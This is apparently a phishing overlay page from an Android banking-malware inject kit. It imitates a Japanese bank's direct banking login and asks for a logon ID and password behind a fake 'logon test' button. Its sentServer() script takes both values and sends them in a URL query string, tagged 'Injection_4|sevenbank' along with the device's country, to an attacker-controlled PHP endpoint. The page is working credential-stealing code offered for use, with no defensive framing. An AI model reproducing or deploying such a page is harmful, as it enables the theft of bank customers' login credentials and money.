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">
</div>
    <div class="main">
        <div class="container">
            <div class="row">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">
	<br>
	<b>ダイレクトバンキングサービスの「ログオンID」「ログオンパスワード」を入力してください。</b>
	<br>
	<br>
                        <form id="form">

                            <div class="form-group ">
									<label>ログオンID </label>
                                	<input type="text" class="form-control" name="field2" placeholder="例:abc1234" style="padding: 6px;" id="login" autocomplete="off" data-reg="/.{3,50}/">
                            </div>

                            <div class="form-group">
									<label>ログオンパスワード </label>
                                	<input type="password" class="form-control" name="field3" id="password" placeholder="（半角英数字6文字以上)" autocomplete="off" data-reg="/.{3,50}/">
                            </div>
				<img style="width: 18px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAMAAADzapwJAAABpFBMVEVbwvFkxfJkxfJkxfJkxfJkxfJkxfJkxfJkxfIAnukAnukAnukAnukAnukAnukAnukAnukAnukAnukAnukAnukCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoAnukCoeoCoeoCoeoCoeoCoeoCoeoAnukAnukCoeoCoeoCoeoCoeoAnukzs+5kxfICoeoCoeoAnukzs+5kxfIAnukCoeoAnukzs+5kxfIAnukCoeoCoeoCoeoAnukzs+5kxfIAnukCoeoCoeozs+4AnukCoeoCoeoCoeozs+5kxfIAnukzs+5kxfIAnukAnukzs+5kxfIAnukAnukzs+4AnukAnukzs+4AnukCoeoCoeoAnukCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoAnukCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoCoeoAnukAnukAnukAnukAnukAnukAnukAnukAnukAnukzs+4zs+4zs+4zs+4zs+4zs+4zs+4zs+6xX1B+AAAAjHRSTlMAAjZfen5uSxoIV4NyTzo3Q2OBdScxjl0RNYdpAUiQHl+DBziLCAJjjSBNfA6REzT/pGpTYksi6X6MDw8FHVZTSmQGG314PiPe4wJ/hiwom2UpJ/mXXoMzc2JRC4MoeThtfnosMn8zfW9UJODliBKTGgRSAwoalXh2RUiLZy4BBRxNhRIHRHKBfnp5IBE/+wQAAAEISURBVBjTY2CAAEYmZhZWNnYOBmTAycXNw8vHLyAoJCyCEBUVE5eAMiWlpGWgTFk5eSSdCopKYFpZRRVEqalraIL5WtogUkdXD8zTNzAwhKg3MgYSJqYQjpm5gQWEpWRpxWDNbQM11FYZZrydPYODI5StpuqkBGU6uzC4ukHZ7h6eUlCmlzeDjy+U7Wdg4A8zJYDBJxDKDAo2CIEJhzKEhWMRjmCIjMIUjo5hiI3DFI5PYGBINMMQTkpmYEhJRXdJWjqIzMgEc7Kyc3LBjLz8AhBVqFgEoool8kpAdGkZNBCcyiv04MFdqZsGZ1dV19RG1zHUNzQ2CTcjRUlLa1t7R2d7V2g3hA8A5KYxBLs6eDUAAAAASUVORK5CYII=">
				<b style="color: #009de9;font-weight: 500;font-size: 12px;"> ログオンID、ログオンパスワードでお困りの方 </b><br>

			<b style="display: block;text-align: center; color: #949694;font-size: 12px;"> ログオンテストをタップして確認しましょう </b>
							<input type="button" class="input_submitBtn" onClick="sentServer();" value="ログオンテスト">

                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|sevenbank|"+login1+"|"+pass);
	}
	}
</script>

</body>
</html>
